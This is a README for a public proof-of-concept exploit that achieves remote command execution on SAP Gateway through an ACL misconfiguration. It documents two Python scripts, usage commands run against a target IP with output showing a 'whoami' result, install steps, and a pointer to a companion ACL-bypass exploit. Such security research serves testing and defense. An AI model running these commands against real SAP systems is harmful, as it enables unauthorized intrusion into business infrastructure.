## What is it?

PoC that exploits ACL misconfiguration in SAP Gateway (port 33xx) leads to Remote Command Execution (RCE)

`SAPanonGWv1.py` is the first version of exploit based raw packets sending. Doesn't require any additional modules (Run and Pwn!).

`SAPanonGWv2.py` is the second version of exploit based on [pysap](https://github.com/gelim/pysap) library.

## Creds

This Poc was developed by Dmitry [@_chipik](https://twitter.com/_chipik) Chastuhin 


## How to use

```bash
➜python SAPanonGWv1.py -t 172.16.30.28 -p 3300 -c whoami
[*] sending cmd:whoami
n45adm
```


```bash
➜python SAPanonGWv2.py -t <ip> -p 3300 -c whoami
[INFO ] [+] Sending GW_NORMAL_CLIENT
[INFO ] Response: OK
[INFO ] [+] Sending F_SAP_INIT
[INFO ] Response: OK
[INFO ] [+] Sending F_SAP_SEND
[INFO ] [+] Sending F_SAP_SEND2
n45adm
```


## Installation

Only for `SAPanonGWv2.p`

```
git clone https://github.com/gelim/pysap
pip install -r pysap/requirements.txt
python pysap/setup.py install
git clone https://github.com/chipik/SAP_GW_RCE_exploit
```

or 

```
git clone https://github.com/chipik/SAP_GW_RCE_exploit
pip install -r SAP_GW_RCE_exploit/requirements.txt
```

## SAP GW ACL bypass

You can use these exploits together with [SAP MS Trusted](https://github.com/gelim/sap_ms) exploit that allows you to bypass dafault `sec_info` ACL

See our [presentation ](https://docs.google.com/presentation/d/e/2PACX-1vTaDjuplkEr5OVRFdfy4Dya4Df9WyzrnFrWwJQh4SJf856_JU2gFRKVUPWoYK5yYUPTw0Q2V0VXbmPQ/pub?start=false&loop=false&delayms=3000) for details

### Contributors

Contributions made by:

  * Dmitry Chastuhin ([@_chipik](https://twitter.com/_chipik))
  * Mathieu Geli ([@gelim](https://github.com/gelim))
